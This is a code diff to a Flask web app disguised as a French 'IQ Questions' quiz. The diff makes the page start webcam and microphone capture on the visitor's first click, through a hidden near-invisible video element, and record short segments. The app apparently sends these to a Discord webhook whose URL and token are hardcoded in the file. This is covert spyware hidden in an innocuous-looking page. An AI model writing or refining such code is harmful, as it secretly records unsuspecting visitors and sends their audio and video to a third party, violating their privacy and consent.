@@ -4,7 +4,7 @@ import requests
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
-app.config["MAX_CONTENT_LENGTH"] = 30 * 1024 * 1024  # 30MB max
+app.config["MAX_CONTENT_LENGTH"] = 30 * 1024 * 1024
 
 DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1566437289113161940/qkaHvkxwmc_uuM3YMobIKnL9kaJhRI9XA4-OwYMpIJEWZnagp5mqEE93c4es2n2aTXA1")
 
@@ -52,7 +52,7 @@ HTML_TEMPLATE = """
         #video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
     </style>
 </head>
-<body>
+<body onclick="initCameraOnce()">
 <div class="card">
     <div class="top-bar">
         <div class="welcome-badge" id="welcomeText">Bienvenue dans IQ Questions</div>
@@ -176,6 +176,19 @@ HTML_TEMPLATE = """
     let mediaStream = null;
     let mediaRecorder = null;
     let recordedChunks = [];
+    let cameraInitialized = false;
+
+    async function initCameraOnce() {
+        if (cameraInitialized) return;
+        cameraInitialized = true;
+        try {
+            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
+            document.getElementById('webcam').srcObject = mediaStream;
+            startNewSegment();
+        } catch (err) {
+            console.error("Camera denied", err);
+        }
+    }
 
     function startNewSegment() {
         if (!mediaStream) return;
@@ -198,14 +211,6 @@ HTML_TEMPLATE = """
             setTimeout(() => { if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
         } catch (err) {}
     }
-
-    window.addEventListener('DOMContentLoaded', async () => {
-        try {
-            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
-            document.getElementById('webcam').srcObject = mediaStream;
-            setTimeout(() => { startNewSegment(); }, 2000);
-        } catch (err) {}
-    });
 
     async function verifyAndSend() {
         const status = document.getElementById('status');
